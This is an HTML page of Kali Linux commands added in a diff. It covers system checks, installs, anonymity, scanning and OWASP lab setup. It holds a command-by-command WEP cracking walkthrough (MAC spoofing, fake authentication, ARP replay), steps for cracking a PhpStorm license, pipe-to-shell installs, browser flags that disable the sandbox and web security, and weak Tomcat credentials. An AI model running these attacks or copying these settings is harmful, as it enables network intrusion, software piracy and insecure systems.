@@ -1,0 +1,243 @@
+<body>
+
+    </html>
+    <br>I have written a too long guide commands I learned and started to use since 2009 is my guess when I am thinking on it. I thought instead this could be useful maybe for new-beginners also of course maybe advanced users: (Few things things are copied straight(very few)..
+    <br>I hopefully this could be useful to all of you took few hours to clean it up :)
+    <br> Enjoy!
+    <br>
+    <h1>U S E R C O M M A ND S S E C T I O N </h1>
+    <br>Find files: find / -name mrquiety.txt
+    <br>locate - List files in databases that match a pattern Syntax – locate 'name*'
+    <br>
+    <h3>netstat:</h3> With netstat the command you need to enter is: sudo netstat --tcp --udp --listening --program
+    <br>
+    <h3>Check memory usage on linux. Here is a quick example:</h3> free -m
+    <br>total used free shared buffers cached Mem: 7976 6459 1517 0 865 2248 -/+ buffers/cache: 3344 4631 Swap: 1951 0 1951 (The m option displays all data in MBs. The total os 7976 MB is the total amount of RAM installed on the system, that is 8GB.) (The used column shows the amount of RAM that has been used by linux, in this case around 6.4 GB.) (The output is pretty self explanatory. The catch over here is the cached and buffers column. The second line tells that 4.6 GB is free). (This is the free memory in first line added with the buffers and cached amount of memory).
+    <br>
+    <h3>Check proc/meminfo:</h3> The next way to check memory usage is to read the /proc/meminfo file. Know that the /proc file system does not contain real files). (They are rather virtual files that contain dynamic information about the kernel and the system). cat /proc/meminfo
+    <br>MemTotal: 8167848 kB MemFree: 1409696 kB Buffers: 961452 kB Cached: 2347236 kB SwapCached: 0 kB...... .... (Check the values of MemTotal, MemFree, Buffers, Cached, SwapTotal, SwapFree. They indicate same values of memory usage as the free command).
+    <br>
+    </h3>vmstat The vmstat command with the s option, lays out the memory usage statistics much like the proc command. Here is an example:)</h3>
+    vmstat -s
+    <br>8167848 K total memory 7449376 K used memory 3423872 K active memory ...... ... (The top few lines indicate total memory, free memory etc and so on).
+    <br>
+    <h3>Top command:</h3> (The top command is generally used to check memory and cpu usage per process. However it also reports total memory usage and can be used to monitor the total RAM usage). (The header on output has the required information. Here is a sample output:)
+    <br>top – 15:20:30 up 6:57, 5 users, load average: 0.64, 0.44, 0.33 Tasks: 265 total, 1 running, 263 sleeping, 0 stopped, 1 zombie %Cpu(s): 7.8 us, 2.4 sy, 0.0 ni, 88.9 id, 0.9 wa, 0.0 hi, 0.0 si, 0.0 st KiB Mem: 8167848 total, 6642360 used, 1525488 free, 1026876 buffers KiB Swap: 1998844 total, 0 used, 1998844 free, 2138148 cached
+    <br>PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 2986 enlighte 20 0 584m 42m 26m S 14.3 0.5 0:44.27 yakuake 1305 root 20 0 448m 68m 39m S 5.0 0.9 3:33.98 Xorg 7701 enlighte 20 0 424m 17m 10m S 4.0 0.2 0:00.12 kio_thumbnail.. ... (Check the KiB Mem and KiB Swap lines on the header. They indicate total, used and free amounts of the memory. (The buffer and cache information is present here too, like the free command).
+    <br>
+    <h3>Get file Info:</h3> ls -lh 'filename'
+    <br>
+
+    <h3>To see all running services:</h3> service --status-all
+    <br>
+    <br>
+    <h1>M A I N T A I N  & A P P  I N S T A L L  S E C T I O N /</h1>
+    <br>
+    <h2>Dist upgrade</h2>
+    <br>
+    <h3>Update kernel List</h3> leafpad /etc/apt/sources.list
+    <br> OLD OF DO THIS!!
+    <br>deb {{Your Source}} apt-get update apt-get upgrade -y wget -q -O - {{Your Source Key }} | apt-key add
+    <br> (now the uname -r should point to the 4.12.0-kali2-amd64 kernel headers version) (The easy way is to upgarade entirely your system followig those steps:)
+    <br>apt update apt upgrade apt dist-upgrade sudo reboot
+    <br>
+    <h3>get latest headers</h3> apt-cache search {{Your linux image}} apt install linux-headers-$(uname -r) apt autoremove
+    <br>
+    <h3>Virtualbox Guest Addon Install</h3>
+    <br>cp /media/cdrom0/VBoxLinuxAdditions.run /root/Desktop/ cd /root/Desktop/ chmod 755 /root/VBoxLinuxAdditions.run ./VBoxLinuxAdditions.run
+    <br>
+    <h3>Install nodeJS</h3>
+    <br>curl -sL https://deb.nodesource.com/setup_6.x | sudo -E bash - sudo apt-get install -y nodejs node -v
+
+    <br>
+    <h1>A P P L I C A T I O N S :</h1>
+    <h3>Install PHP Storm:</h3> (download the file manually)
+    <br>sudo tar xf PhpStorm-*.tar.gz -C /opt/ cd opt/PhpStorm-*/bin chmod +x /PPhpStormxx/ ./phpstorm.sh
+    <br> (Cracking if needed:) (copy the license server to following location '/opt/dvt-jb-lic-server/'.
+    <br>cd /opt/dvt-jb-lic-server/ chmod +x /opt/dvt-jb-lic-server/ chmod +x /opt/dvt-jb-lic-server/dvt-jb_licsrv.linux.amd64 ./dvt-jb_licsrv.linux.amd64
+    <br>(Naviate to URL:) http://127.0.0.1:1337
+    <br> Check the box for activation Launch PHP Storm.
+    <br>
+    <h3>Install Destkop Launcher:</h3>
+    <br>sudo apt-get install --no-install-recommends gnome-panel gnome-desktop-item-edit /root/Desktop --create-new
+    <br>
+    <h3>Install Synaptic</h3>
+    <br>apt-get install synaptic
+    <br>
+    <h3>Install Metasploit Manually:</h3> (download it manually and then run:) chmod -x xxxx.run update-rc.d postgresql enable update-rc.d metasploit enable
+    <br>(SSL PORT 3790)
+    <br> sudo service postgresql start sudo service postgresql status sudo service metasploit status sudo msfdb init
+    <br> msf>db_status
+    <br>
+    <br>
+    <h3>Install WPScan</h3>
+    <br>sudo apt-get install git sudo apt-get install git ruby ruby-dev libcurl4-openssl-dev make git clone https://github.com/wpscanteam/wpscan.git cd wpscan sudo gem install bundler && bundle install --without test
+    <br>
+    <h3>Make WireShark work need to disabla lua as superuser:</h3>
+    <br>leafpad /usr/share/wireshark/init.lua disable_lua=true
+    <br>
+    <h3>Add a own/Remove Workspace:</h3> Workspace -a xxx (Add a Workspace) workspace -d xxx (Removes a Workspace)
+    <br>
+    <br>
+    <h3>Install java jdk 8</h3>
+
+    <br>leafpad/etc/apt/sources.list deb http://ppa.launchpad.net/webupd8team/java/ubuntu trusty main deb-src http://ppa.launchpad.net/webupd8team/java/ubuntu trusty main
+    <br>
+    <br>apt-key adv --keyserver http://keyserver.ubuntu.com:80 --recv-keys EEA14886 apt-get update apt-get install oracle-java8-installer
+    <br> (write in console then 'java -version', to see current)
+    <br>
+    <h3>Install Tomcat7 (from Synaptic)</h3> Install following packages: tomcat7 tomcat7-admin tomcat7-common tomcat-docs tomcat7-examples tomcat7-user
+    <br>
+    <h3>Edit the tomcat7 config:</h3> leafpad /etc/tomcat7/tomcat-users.xml
+    <br>
+    <h3>Add following lines in the config:</h3>
+    <br>
+    <role rolename="admin-gui" />
+    <user username="tomcat" password="admin" roles="admin-gui" />
+    <br>sudo service tomcat7 start (Start the service)
+    <br>
+    <h3>Install gdebi</h3>
+    <br>Add following sources to apt list: leafpad /etc/apt/sources.list
+    <br> deb [arch=i386,amd64,armel,armhf] http://http.kali.org/kali kali-dev main contrib non-free deb [arch=i386,amd64,armel,armhf] http://http.kali.org/kali kali-dev main/debian-installer deb-src http://http.kali.org/kali kali-dev main contrib non-free deb http://repo.kali.org/kali kali-bleeding-edge main
+    <br> apt-get update apt-get install gdebi
+    <br>
+    <h3>Remove old Browser:</h3> apt-get remove iceweasel
+    <br>
+    <br>
+    <h3>Install Google Chrome:</h3>
+    <br>wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb cd /Downloads/ gdebi google-chrome-stable_current_amd64.deb
+    <br>
+    <br>
+    <h3>Install Firefox:</h3>
+    <br>echo -e "\ndeb http://downloads.sourceforge.net/project/ubuntuzilla/mozilla/apt all main" | tee -a /etc/apt/sources.list > /dev/null apt-key adv --recv-keys --keyserver keyserver.ubuntu.com C1289A29 apt-get update apt-get install firefox-mozilla-build
+    <br>
+    <h3>Install Chronium</h3>
+    <br>apt-get install chromium leafpad /etc/chromium.d/default-flags export CHROMIUM_FLAGS="$CHROMIUM_FLAGS --password-store=detect --no-sandbox --user-data-dir" export CHROMIUM_FLAGS="$CHROMIUM_FLAGS --disable-web-security"
+    <br>
+    <br>
+    <h3>Install Postman</h3> (Create following file somewhere 'install-postman.sh') (Add below content to the file you create 'install-postman.sh':
+    <br> #!/bin/bash cd /tmp || exit echo "Downloading Postman ..." wget -q https://dl.pstmn.io/download/latest/linux?arch=64 -O postman.tar.gz tar -xzf postman.tar.gz rm postman.tar.gz
+    <br>echo "Installing to opt..." if [ -d "/opt/Postman" ];then sudo rm -rf /opt/Postman fi sudo mv Postman /opt/Postman
+    <br>echo "Creating symbolic link..." if [ -L "/usr/bin/postman" ];then sudo rm -f /usr/bin/postman fi sudo ln -s /opt/Postman/Postman /usr/bin/postman
+    <br>echo "Installation completed successfully." echo "You can use Postman!"
+    <br> (Run install :) sh install-postman.sh
+    <br>(Create the desktop launcher:) leafpad {{path to create the desktop icon }}Postman.desktop
+    <br>
+    <h3>Add following content:</h3>
+    <br> [Desktop Entry] Encoding=UTF-8 Name=Postman Exec=postman Icon=/opt/Postman/resources/app/assets/icon.png Terminal=false Type=Application Categories=Development;
+    <br>
+    <br>
+    <h2>Stay Anonymous section:</h2>
+    <br>
+    <h3>Network</h3> leafpad /etc/NetworkManager/NetworkManager.conf
+    <br>change the value from 'false' to true Managed=true
+    <br>
+    <h3>Edit Proxychains</h3> leafpad /etc/proxychains.conf
+    <br>dynamic chain #strict chain //commented 'strict' and activated 'dynamic' socks4 127.0.0.1 9050 socks5 127.0.0.1 9050
+    <br>
+    <h3>Set up own dns in Kali-Linux:</h3> leafpad /etc/resolv.conf
+    <br>#nameserver 192.168.1.1 (commented your own gateway).
+    <br>nameserver xxx.xxx.xxx.xxx nameserver xxx.xxx.xxx.xxx
+    <br> use some of following dns below: OpenDns:
+    <br>208.67.222.222 208.67.220.220
+    <br>Comodo DNS public:
+    <br>NS1: 8.26.56.26 NS2: 8.20.247.20
+    <br> Google DNS public:
+    <br>NS1: 8.8.8.8 NS2: 8.8.4.4
+    <br> DNSAdvantadge DNS public:
+    <br>NS1: 156.154.70.1 NS2: 156.154.71.1
+    <br>
+    <h3>Change hostname of machine:</h3>
+    <br>leafpad /etc/hosts 127.0.0.1Your Username)
+    <br>
+    <br>
+    <h3>Restart network manager:</h3>
+    <br>service network-manager restart
+    <br>
+    <h3>Auto-generate a new mac-adress on boot:</h3> leafpad /etc/init.d/mymacchanger.sh add content below:
+    <br>#!/bin/bash ifconfig eth0 down macchanger -r eth0 ifconfig eth0 up
+    <br>(Save file and run below commands:
+    <br>chmod +x /etc/init.d chmod +x mymacchanger.sh update-rc.d mymacchanger.sh defaults 100
+    <br>
+    <h3>Add and Remove Network Profiles:</h3> sudo ls -l /etc/NetworkManager/system-connections/ // Remove Network Profiles: sudo rm /etc/NetworkManager/system-connections/NETWORK_NAME
+    <br>
+    <br>
+    <h3>Install several VPN tunnels:</h3>
+    <br>apt-get install network-manager-openvpn-gnome -y apt-get install network-manager-pptp -y apt-get install network-manager-pptp-gnome -y apt-get install network-manager-strongswan -y apt-get install network-manager-vpnc -y apt-get install network-manager-vpnc-gnome -y
+    <br>
+    <h3>Run openVPN command example:</h3>
+    <br>openvpn --config {{'*.ovpn'(Your downloaded file)}} (vpnbook.com download the *.vpn file from vpnbook for instance)
+    <br>(add content below manually:)
+    <br>Username: vpnbook Password: jmm66cf
+    <br>
+    <h3>Install Tor</h3>
+    <br>leafpad /etc/apt/sources.list deb http://deb.torproject.org/torproject.org wheezy main gpg --keyserver keys.gnupg.net --recv 886DDD89 gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | apt-key add - apt-get update apt-get install deb.torproject.org-keyring apt-get install tor sudo update-rc.d tor enable
+    <br>
+    <h1>O P T I M I Z E K A L I L I N U X </h1>
+    <br>
+    <h3>Install Preload is a daemon that runs in the background (invisible) that detects most used applications and store them in cache so that they can be called quickly) which will result in quick system load time).</h3> (To install it on Backtrack/Kali Linux, run this command:) sudo apt-get install preload
+    <br> (Adjust Swappiness:) (To check your current used Swappiness, run this command:) cat /proc/sys/vm/swappiness
+    <br>(The default value is 60, to change it, edit this file:)
+    <br>sudo gedit /etc/sysctl.conf
+    <br> (Search for this line (if not present, just add it:) vm.swappiness=10
+    <br> (Use TMPFS To Reduce Disk I/O) (The /tmp folder receives a lot of hard disk read/write operations). (You can simply use your system RAM instead of your hard disk to speed up read/write operations for the /tmp folder. To do this, you can follow these instructions:) sudo gedit /etc/fstab
+    <br>(At the end of the file, add these two lines:) (Move /tmp to RAM) tmpfs /tmp tmpfs defaults,noexec,nosuid 0 0
+    <br>
+    <h1>S C A N N I N G  W I TH  V A R I O S  A P P S :</h1>
+    <br>
+    <h3>Scan with nmap:</h3>
+    <br>nmap -sS -O 192.168.1.178 nmap -sn 192.168.1-255
+    <br>hosts services
+    <br>
+    <h3>Scan with Dirb:</h3>
+    <br>dirb {{Your target}} -p http://127.0.0.1:8080
+    <br>
+    <br>
+    <h3>Scan with Aircrack:</h3>
+    <br> (First things first, we want to spoof our mac address and enable monitor mode)
+    <br> airmon-ng stop wlan0 (or whatever your interface is you can type ifconfig to see it) ifconfig wlan0 down macchanger -m 00:11:22:33:44:55 wlan0 ifconfig wlan0 up airmon-ng start wlan0
+    <br> (Now once this has been accomplished we want to view the networks in our area, We can do this by typing this:)
+    <br> airodump-ng wlan0
+    <br>or to use monitor mode (no transmissions which helps with anonymity:)
+    <br>airodump-ng mon0
+    <br> (You will get a screen that will look something like this. Once you get to this screen and you see which network you want to crack you will press ctrl + c)
+    <br>(This ends the process and enables you to copy the bssid or Access point Mac address to your clipboard for later use:)
+    <br>(Now you want to tell airodump-ng to only listen to the network you are trying to crack, and create a '*.cap' file for aircrack to crack later:)
+    <br>airodump-ng -c 6 -w test --bssid '{{TARGET eg:E0:91:F5:E5:9E:2A}}' wlan0
+    <br> (With airodump-ng the -c option tells it to listen on channel 6 which our test network is on and the -w creates a file named test-01.cap where airodump will store the information it captures (for our cracking purposes. Now its time to open a new terminal. In this terminal we want to associate ourselves with the router so we will run:)
+    <br>aireplay-ng -1 6000 -q 12 -o 1 -a {{TARGET eg:E0:91:F5:E5:9E:2A}}' wlan0
+    <br> (The -1 attack is the fake authentication attack it will associate us with the router (access point) every 6000 seconds). (The -q option sets aireplay-ng to send keep-alive packets every 12 seconds, and the -o option sets the number of packets per burst to the default number). (The -a option sets the access points mac to send the attack to).
+    <br> (Now we need to open up another terminal so we can tell the router to send us ARP request packets. We will run the following command:)
+    <br>aireplay-ng -3 -b {{TARGET eg:E0:91:F5:E5:9E:2A}}' wlan0
+    <br> (The -3 command tells aireplay to use the ARP request replay attack). (The -b tells it to filter only ARP packets from the access point we are cracking) (The -h command tells it to send the router your fake mac address as the source of the requests).
+    <br>(Now you should see the data column from airodump-ng start climbing very rapidly. This is what we want. Usually it takes about 10,000 data packets to crack the key).
+    <br>it's now time for crack the password:
+    <br>aircrack-ng -b E0:91:F5:E5:9E:2A test-01.cap
+    <h1>O W A S P  C H A L L A N G E S  I N S T A L L </h1>
+    <br>
+    <h3>Remove previously installed Docker:</h3>
+    <br>sudo apt-get purge lxc-docker* sudo apt-get purge docker.io* # add Docker repo sudo apt-get install -y apt-transport-https ca-certificates sudo apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D sudo apt-get update
+    <br>
+    <h3>install Docker:</h3>
+    <br>sudo apt-get install -y docker-engine sudo service docker start sudo docker run hello-world
+    <br>
+    <h3>Configure Docker user group permissions</h3>
+    <br>sudo groupadd docker sudo gpasswd -a ${USER} docker sudo service docker restart
+    <br>
+    <br>
+    <h3>JUICESHOP - install get a docker image example:</h3>
+    <br>docker pull bkimminich/juice-shop docker run -d -p 3000:3000 bkimminich/juice-shop sudo systemctl enable docker http://localhost:3000
+    <br>
+    <h3>WebGoat:</h3>
+    <br> wget https://github.com/WebGoat/WebGoat/releases/download/7.1/webgoat-container-7.1-exec.jar java -jar webgoat-container-7.1-exec.jar
+    <br>here is the loginpage http://localhost:8080/WebGoat/login.mvc
+	<br>
+	<br>
+    <h2> Thank you
+    <br>Best Regards
+    <br>Xsi
+    <br>
+	</h2>
+
+    </html>
+</body>
